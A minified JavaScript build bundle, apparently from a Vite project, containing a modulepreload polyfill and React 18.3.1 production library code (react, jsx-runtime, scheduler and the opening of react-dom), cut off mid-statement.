function lh(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=t(r);fetch(r.href,i)}})();function oh(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var uu={exports:{}},di={},pu={exports:{}},F={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Vs=Symbol.for("react.element"),ch=Symbol.for("react.portal"),uh=Symbol.for("react.fragment"),ph=Symbol.for("react.strict_mode"),dh=Symbol.for("react.profiler"),hh=Symbol.for("react.provider"),fh=Symbol.for("react.context"),mh=Symbol.for("react.forward_ref"),gh=Symbol.for("react.suspense"),yh=Symbol.for("react.memo"),vh=Symbol.for("react.lazy"),_o=Symbol.iterator;function wh(e){return e===null||typeof e!="object"?null:(e=_o&&e[_o]||e["@@iterator"],typeof e=="function"?e:null)}var du={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},hu=Object.assign,fu={};function $t(e,n,t){this.props=e,this.context=n,this.refs=fu,this.updater=t||du}$t.prototype.isReactComponent={};$t.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};$t.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function mu(){}mu.prototype=$t.prototype;function fl(e,n,t){this.props=e,this.context=n,this.refs=fu,this.updater=t||du}var ml=fl.prototype=new mu;ml.constructor=fl;hu(ml,$t.prototype);ml.isPureReactComponent=!0;var So=Array.isArray,gu=Object.prototype.hasOwnProperty,gl={current:null},yu={key:!0,ref:!0,__self:!0,__source:!0};function vu(e,n,t){var s,r={},i=null,a=null;if(n!=null)for(s in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(i=""+n.key),n)gu.call(n,s)&&!yu.hasOwnProperty(s)&&(r[s]=n[s]);var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){for(var o=Array(l),c=0;c<l;c++)o[c]=arguments[c+2];r.children=o}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)r[s]===void 0&&(r[s]=l[s]);return{$$typeof:Vs,type:e,key:i,ref:a,props:r,_owner:gl.current}}function kh(e,n){return{$$typeof:Vs,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function yl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Vs}function bh(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var Eo=/\/+/g;function Mi(e,n){return typeof e=="object"&&e!==null&&e.key!=null?bh(""+e.key):n.toString(36)}function wr(e,n,t,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(i){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case Vs:case ch:a=!0}}if(a)return a=e,r=r(a),e=s===""?"."+Mi(a,0):s,So(r)?(t="",e!=null&&(t=e.replace(Eo,"$&/")+"/"),wr(r,n,t,"",function(c){return c})):r!=null&&(yl(r)&&(r=kh(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(Eo,"$&/")+"/")+e)),n.push(r)),1;if(a=0,s=s===""?".":s+":",So(e))for(var l=0;l<e.length;l++){i=e[l];var o=s+Mi(i,l);a+=wr(i,n,t,o,r)}else if(o=wh(e),typeof o=="function")for(e=o.call(e),l=0;!(i=e.next()).done;)i=i.value,o=s+Mi(i,l++),a+=wr(i,n,t,o,r);else if(i==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function Zs(e,n,t){if(e==null)return e;var s=[],r=0;return wr(e,s,"","",function(i){return n.call(t,i,r++)}),s}function xh(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var xe={current:null},kr={transition:null},_h={ReactCurrentDispatcher:xe,ReactCurrentBatchConfig:kr,ReactCurrentOwner:gl};function wu(){throw Error("act(...) is not supported in production builds of React.")}F.Children={map:Zs,forEach:function(e,n,t){Zs(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Zs(e,function(){n++}),n},toArray:function(e){return Zs(e,function(n){return n})||[]},only:function(e){if(!yl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};F.Component=$t;F.Fragment=uh;F.Profiler=dh;F.PureComponent=fl;F.StrictMode=ph;F.Suspense=gh;F.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=_h;F.act=wu;F.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=hu({},e.props),r=e.key,i=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(i=n.ref,a=gl.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(o in n)gu.call(n,o)&&!yu.hasOwnProperty(o)&&(s[o]=n[o]===void 0&&l!==void 0?l[o]:n[o])}var o=arguments.length-2;if(o===1)s.children=t;else if(1<o){l=Array(o);for(var c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}return{$$typeof:Vs,type:e.type,key:r,ref:i,props:s,_owner:a}};F.createContext=function(e){return e={$$typeof:fh,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:hh,_context:e},e.Consumer=e};F.createElement=vu;F.createFactory=function(e){var n=vu.bind(null,e);return n.type=e,n};F.createRef=function(){return{current:null}};F.forwardRef=function(e){return{$$typeof:mh,render:e}};F.isValidElement=yl;F.lazy=function(e){return{$$typeof:vh,_payload:{_status:-1,_result:e},_init:xh}};F.memo=function(e,n){return{$$typeof:yh,type:e,compare:n===void 0?null:n}};F.startTransition=function(e){var n=kr.transition;kr.transition={};try{e()}finally{kr.transition=n}};F.unstable_act=wu;F.useCallback=function(e,n){return xe.current.useCallback(e,n)};F.useContext=function(e){return xe.current.useContext(e)};F.useDebugValue=function(){};F.useDeferredValue=function(e){return xe.current.useDeferredValue(e)};F.useEffect=function(e,n){return xe.current.useEffect(e,n)};F.useId=function(){return xe.current.useId()};F.useImperativeHandle=function(e,n,t){return xe.current.useImperativeHandle(e,n,t)};F.useInsertionEffect=function(e,n){return xe.current.useInsertionEffect(e,n)};F.useLayoutEffect=function(e,n){return xe.current.useLayoutEffect(e,n)};F.useMemo=function(e,n){return xe.current.useMemo(e,n)};F.useReducer=function(e,n,t){return xe.current.useReducer(e,n,t)};F.useRef=function(e){return xe.current.useRef(e)};F.useState=function(e){return xe.current.useState(e)};F.useSyncExternalStore=function(e,n,t){return xe.current.useSyncExternalStore(e,n,t)};F.useTransition=function(){return xe.current.useTransition()};F.version="18.3.1";pu.exports=F;var E=pu.exports;const ku=oh(E),Sh=lh({__proto__:null,default:ku},[E]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Eh=E,Th=Symbol.for("react.element"),Ch=Symbol.for("react.fragment"),Ah=Object.prototype.hasOwnProperty,Ph=Eh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Nh={key:!0,ref:!0,__self:!0,__source:!0};function bu(e,n,t){var s,r={},i=null,a=null;t!==void 0&&(i=""+t),n.key!==void 0&&(i=""+n.key),n.ref!==void 0&&(a=n.ref);for(s in n)Ah.call(n,s)&&!Nh.hasOwnProperty(s)&&(r[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)r[s]===void 0&&(r[s]=n[s]);return{$$typeof:Th,type:e,key:i,ref:a,props:r,_owner:Ph.current}}di.Fragment=Ch;di.jsx=bu;di.jsxs=bu;uu.exports=di;var b=uu.exports,xu={exports:{}},ze={},_u={exports:{}},Su={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(S,L){var R=S.length;S.push(L);e:for(;0<R;){var D=R-1>>>1,B=S[D];if(0<r(B,L))S[D]=L,S[R]=B,R=D;else break e}}function t(S){return S.length===0?null:S[0]}function s(S){if(S.length===0)return null;var L=S[0],R=S.pop();if(R!==L){S[0]=R;e:for(var D=0,B=S.length,ye=B>>>1;D<ye;){var W=2*(D+1)-1,ve=S[W],le=W+1,de=S[le];if(0>r(ve,R))le<B&&0>r(de,ve)?(S[D]=de,S[le]=R,D=le):(S[D]=ve,S[W]=R,D=W);else if(le<B&&0>r(de,R))S[D]=de,S[le]=R,D=le;else break e}}return L}function r(S,L){var R=S.sortIndex-L.sortIndex;return R!==0?R:S.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var a=Date,l=a.now();e.unstable_now=function(){return a.now()-l}}var o=[],c=[],u=1,h=null,f=3,g=!1,k=!1,y=!1,w=typeof setTimeout=="function"?setTimeout:null,d=typeof clearTimeout=="function"?clearTimeout:null,p=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function m(S){for(var L=t(c);L!==null;){if(L.callback===null)s(c);else if(L.startTime<=S)s(c),L.sortIndex=L.expirationTime,n(o,L);else break;L=t(c)}}function v(S){if(y=!1,m(S),!k)if(t(o)!==null)k=!0,A(x);else{var L=t(c);L!==null&&z(v,L.startTime-S)}}function x(S,L){k=!1,y&&(y=!1,d(N),N=-1),g=!0;var R=f;try{for(m(L),h=t(o);h!==null&&(!(h.expirationTime>L)||S&&!Q());){var D=h.callback;if(typeof D=="function"){h.callback=null,f=h.priorityLevel;var B=D(h.expirationTime<=L);L=e.unstable_now(),typeof B=="function"?h.callback=B:h===t(o)&&s(o),m(L)}else s(o);h=t(o)}if(h!==null)var ye=!0;else{var W=t(c);W!==null&&z(v,W.startTime-L),ye=!1}return ye}finally{h=null,f=R,g=!1}}var T=!1,P=null,N=-1,j=5,M=-1;function Q(){return!(e.unstable_now()-M<j)}function pe(){if(P!==null){var S=e.unstable_now();M=S;var L=!0;try{L=P(!0,S)}finally{L?ae():(T=!1,P=null)}}else T=!1}var ae;if(typeof p=="function")ae=function(){p(pe)};else if(typeof MessageChannel<"u"){var _=new MessageChannel,I=_.port2;_.port1.onmessage=pe,ae=function(){I.postMessage(null)}}else ae=function(){w(pe,0)};function A(S){P=S,T||(T=!0,ae())}function z(S,L){N=w(function(){S(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(S){S.callback=null},e.unstable_continueExecution=function(){k||g||(k=!0,A(x))},e.unstable_forceFrameRate=function(S){0>S||125<S?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):j=0<S?Math.floor(1e3/S):5},e.unstable_getCurrentPriorityLevel=function(){return f},e.unstable_getFirstCallbackNode=function(){return t(o)},e.unstable_next=function(S){switch(f){case 1:case 2:case 3:var L=3;break;default:L=f}var R=f;f=L;try{return S()}finally{f=R}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(S,L){switch(S){case 1:case 2:case 3:case 4:case 5:break;default:S=3}var R=f;f=S;try{return L()}finally{f=R}},e.unstable_scheduleCallback=function(S,L,R){var D=e.unstable_now();switch(typeof R=="object"&&R!==null?(R=R.delay,R=typeof R=="number"&&0<R?D+R:D):R=D,S){case 1:var B=-1;break;case 2:B=250;break;case 5:B=1073741823;break;case 4:B=1e4;break;default:B=5e3}return B=R+B,S={id:u++,callback:L,priorityLevel:S,startTime:R,expirationTime:B,sortIndex:-1},R>D?(S.sortIndex=R,n(c,S),t(o)===null&&S===t(c)&&(y?(d(N),N=-1):y=!0,z(v,R-D))):(S.sortIndex=B,n(o,S),k||g||(k=!0,A(x))),S},e.unstable_shouldYield=Q,e.unstable_wrapCallback=function(S){var L=f;return function(){var R=f;f=L;try{return S.apply(this,arguments)}finally{f=R}}}})(Su);_u.exports=Su;var Lh=_u.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Rh=E,Me=Lh;function C(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Eu=new Set,ks={};function pt(e,n){zt(e,n),zt(e+"Capture",n)}function zt(e,n){for(ks[e]=n,e=0;e<n.length;e++)Eu.add(n[e])}var gn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),ua=Object.prototype.hasOwnProperty,Oh=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,To={},Co={};function Mh(e){return ua.call(Co,e)?!0:ua.call(To,e)?!1:Oh.test(e)?Co[e]=!0:(To[e]=!0,!1)}function Ih(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function zh(e,n,t,s){if(n===null||typeof n>"u"||Ih(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function _e(e,n,t,s,r,i,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=i,this.removeEmptyString=a}var ue={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ue[e]=new _e(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];ue[n]=new _e(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ue[e]=new _e(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ue[e]=new _e(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ue[e]=new _e(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ue[e]=new _e(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ue[e]=new _e(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ue[e]=new _e(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ue[e]=new _e(e,5,!1,e.toLowerCase(),null,!1,!1)});var vl=/[\-:]([a-z])/g;function wl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(vl,wl);ue[n]=new _e(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(vl,wl);ue[n]=new _e(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(vl,wl);ue[n]=new _e(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ue[e]=new _e(e,1,!1,e.toLowerCase(),null,!1,!1)});ue.xlinkHref=new _e("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ue[e]=new _e(e,1,!1,e.toLowerCase(),null,!0,!0)});function kl(e,n,t,s){var r=ue.hasOwnProperty(n)?ue[n]:null;(r!==null?r.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(zh(n,t,r,s)&&(t=null),s||r===null?Mh(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,s=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var bn=Rh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Js=Symbol.for("react.element"),mt=Symbol.for("react.portal"),gt=Symbol.for("react.fragment"),bl=Symbol.for("react.strict_mode"),pa=Symbol.for("react.profiler"),Tu=Symbol.for("react.provider"),Cu=Symbol.for("react.context"),xl=Symbol.for("react.forward_ref"),da=Symbol.for("react.suspense"),ha=Symbol.for("react.suspense_list"),_l=Symbol.for("react.memo"),Sn=Symbol.for("react.lazy"),Au=Symbol.for("react.offscreen"),Ao=Symbol.iterator;function Xt(e){return e===null||typeof e!="object"?null:(e=Ao&&e[Ao]||e["@@iterator"],typeof e=="function"?e:null)}var K=Object.assign,Ii;function is(e){if(Ii===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Ii=n&&n[1]||""}return`
`+Ii+e}var zi=!1;function Di(e,n){if(!e||zi)return"";zi=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var s=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){s=c}e.call(n.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),a=r.length-1,l=i.length-1;1<=a&&0<=l&&r[a]!==i[l];)l--;for(;1<=a&&0<=l;a--,l--)if(r[a]!==i[l]){if(a!==1||l!==1)do if(a--,l--,0>l||r[a]!==i[l]){var o=`
`+r[a].replace(" at new "," at ");return e.displayName&&o.includes("<anonymous>")&&(o=o.replace("<anonymous>",e.displayName)),o}while(1<=a&&0<=l);break}}}finally{zi=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?is(e):""}function Dh(e){switch(e.tag){case 5:return is(e.type);case 16:return is("Lazy");case 13:return is("Suspense");case 19:return is("SuspenseList");case 0:case 2:case 15:return e=Di(e.type,!1),e;case 11:return e=Di(e.type.render,!1),e;case 1:return e=Di(e.type,!0),e;default:return""}}function fa(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case gt:return"Fragment";case mt:return"Portal";case pa:return"Profiler";case bl:return"StrictMode";case da:return"Suspense";case ha:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Cu:return(e.displayName||"Context")+".Consumer";case Tu:return(e._context.displayName||"Context")+".Provider";case xl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case _l:return n=e.displayName||null,n!==null?n:fa(e.type)||"Memo";case Sn:n=e._payload,e=e._init;try{return fa(e(n))}catch{}}return null}function jh(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return fa(n);case 8:return n===bl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Hn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Pu(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Bh(e){var n=Pu(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,i=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){s=""+a,i.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(a){s=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function er(e){e._valueTracker||(e._valueTracker=Bh(e))}function Nu(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=Pu(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function Ir(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function ma(e,n){var t=n.checked;return K({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function Po(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Hn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Lu(e,n){n=n.checked,n!=null&&kl(e,"checked",n,!1)}function ga(e,n){Lu(e,n);var t=Hn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?ya(e,n.type,t):n.hasOwnProperty("defaultValue")&&ya(e,n.type,Hn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function No(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function ya(e,n,t){(n!=="number"||Ir(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var as=Array.isArray;function At(e,n,t,s){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Hn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function va(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(C(91));return K({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Lo(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(C(92));if(as(t)){if(1<t.length)throw Error(C(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Hn(t)}}function Ru(e,n){var t=Hn(n.value),s=Hn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function Ro(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Ou(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function wa(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Ou(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var nr,Mu=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(nr=nr||document.createElement("div"),nr.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=nr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function bs(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var ps={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Fh=["Webkit","ms","Moz","O"];Object.keys(ps).forEach(function(e){Fh.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),ps[n]=ps[e]})});function Iu(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||ps.hasOwnProperty(e)&&ps[e]?(""+n).trim():n+"px"}function zu(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,r=Iu(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,r):e[t]=r}}var Uh=K({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ka(e,n){if(n){if(Uh[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(C(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(C(60));if(typeof 